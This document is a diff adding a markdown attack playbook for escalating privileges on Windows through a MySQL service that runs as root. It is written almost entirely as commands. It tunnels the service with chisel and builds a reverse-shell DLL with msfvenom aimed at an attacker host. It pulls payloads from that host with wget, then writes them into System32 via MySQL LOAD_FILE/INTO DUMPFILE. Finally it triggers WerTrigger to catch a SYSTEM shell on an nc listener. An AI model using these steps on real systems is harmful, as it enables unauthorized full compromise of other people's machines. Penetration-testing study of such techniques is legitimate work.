@@ -1,0 +1,54 @@
+# Privileged MySQL Service File Overwrite
+
+## Requirements
+
+The  MySQL service runs as root
+
+## Steps
+
+### 1) If MySQL runs internally, run a port forward
+
+Attacker
+
+    chisel server --reverse --port LISTEN_PORT
+
+Target
+
+    .\chisel.exe client ATTACKER_IP LISTEN_PORT R:80:127.0.0.1:80
+
+Access the service at
+
+    http://127.0.0.1/phpmyadmin
+
+OR CLI
+
+    mysql -u root -h 127.0.0.1 -p
+
+### 2) Clone the WerTrigger exploit project
+
+    git clone https://github.com/sailay1996/WerTrigger
+
+### 3) Generate a malicious phoneinfo.dll
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f dll > phoneinfo.dll
+
+### 4) Upload phoneinfo.dll, WerTrigger.exe and Report.wer on target machine
+
+    wget http://ATTACK_IP/phoneinfo.dll -O C:\temp\phoneinfo.dll
+    wget http://ATTACK_IP/Report.wer -O C:\temp\Report.wer
+    wget http://ATTACK_IP/WerTrigger.exe -O C:\temp\WerTrigger.exe
+
+### 5) Connect to the MySQL server either via CLI or browser, and execute the following SQL queries to overwrite them to the System32 directory
+
+    SELECT LOAD_FILE('C:\\temp\\phoneinfo.dll') INTO DUMPFILE 'C:\\Windows\\System32\\phoneinfo.dll';
+    SELECT LOAD_FILE('C:\\temp\\WerTrigger.exe') INTO DUMPFILE 'C:\\Windows\\System32\\WerTrigger.exe';
+    SELECT LOAD_FILE('C:\\temp\\Report.wer') INTO DUMPFILE 'C:\\Windows\\System32\\Report.wer';
+
+### 6) Set up listener
+
+    sudo rlwrap nc -lvnp PORT
+
+### 7) Navigate to the System32 directory and execute WerTrigger.exe to catch the reverse shell
+
+    cd C:\Windows\System32\
+    .\WerTrigger.exe
